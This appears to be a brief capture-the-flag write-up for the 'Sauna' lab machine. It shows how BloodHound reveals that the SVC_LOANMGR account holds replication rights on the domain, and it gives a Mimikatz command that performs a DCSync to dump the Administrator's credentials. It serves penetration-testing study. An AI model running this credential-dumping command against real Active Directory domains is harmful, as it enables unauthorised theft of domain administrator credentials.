# Sauna - DCSync / GetChangesAll / GetChanges

Search for SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL in BloodHound. Look for **Outbound Object Control** - items this user has rights over.

[image]

This account has access to `GetChanges` and `GetChangesAll` on the domain - this enables the DCSync attack.

[image]

Right-click on the label to get the abuse info menu:

[image]

The Abuse Info tab includes instructions for how to abuse this privilege:

[image]

## Mimikatz.exe

```bash
mimikatz.exe 'lsadump::dcsync /domain:egotistical-bank.local /user:Administrator' exit
```

[image]
